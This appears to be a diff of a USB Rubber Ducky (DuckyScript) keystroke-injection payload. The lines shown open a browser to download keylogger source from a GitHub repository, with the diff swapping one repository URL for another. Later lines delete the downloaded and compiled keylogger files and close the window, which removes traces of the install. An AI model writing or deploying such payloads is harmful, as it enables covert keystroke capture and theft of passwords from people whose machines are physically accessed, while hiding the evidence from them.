@@ -44,7 +44,7 @@ ENTER
 DELAY 150000
 
 REM Download the keylogger
-STRING explorer "https://github.com/Necterkilo/Keylogger/blob/master/windows/klog_main.cpp"
+STRING explorer "https://github.com/GiacomoLaw/Keylogger/blob/master/windows/klog_main.cpp"
 ENTER
 DELAY 7500
 CTRL-SHIFT s
@@ -83,4 +83,5 @@ STRING del "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\klog_
 ENTER
 STRING del %HOMEPATH%\Downloads\klog_main.cpp
 ENTER
+
 ALT F4
